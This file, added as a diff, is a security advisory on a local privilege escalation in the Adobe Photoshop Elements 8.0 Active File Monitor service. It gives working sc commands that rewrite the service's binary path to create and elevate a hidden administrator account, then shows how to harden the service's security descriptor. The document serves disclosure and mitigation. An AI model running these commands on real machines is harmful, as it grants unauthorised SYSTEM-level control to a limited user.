@@ -1,0 +1,35 @@
+Adobe Photoshop Elements 8.0 Active File Monitor Service Bad Security Descriptor Local Elevation Of Privileges
+by Nine:Situations:Group::bellick
+site: http://retrogod.altervista.org/
+
+Tested on Microsoft Windows XP SP3
+
+The "Adobe Active File Monitor V8" service is installed with an improper security descriptor.
+A malicious user of the Users group (which on xp means a "limited account") can stop the service,
+then invoke the "sc config" command to replace the binary path with a value of choice, then restart
+the service to run the command with SYSTEM privileges ex., run theese commands as a limited user:
+
+sc stop "AdobeActiveFileMonitor8.0"
+sc config "AdobeActiveFileMonitor8.0" binPath= "cmd /c net user adobe kills /add && net localgroup Administrators adobe /add"
+sc start "AdobeActiveFileMonitor8.0"
+runas /noprofile /user:%COMPUTERNAME%\adobe cmd
+
+now login as administrator with password "kills"
+
+mitigation:
+
+the security descriptor of the service is like this:
+
+C:\>sc sdshow "AdobeActiveFileMonitor8.0"
+
+D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
+
+note the WO and WD permission for Everyone (!!!!!)
+
+change the security descriptor like the following:
+
+c:\sc sdset "AdobeActiveFileMonitor8.0" D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPLOCRRC;;;PU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
+[SC] SetServiceObjectSecurity SUCCESS
+
+readings, interesting article:
+http://msmvps.com/blogs/erikr/archive/2007/09/26/set-permissions-on-a-specific-service-windows.aspx
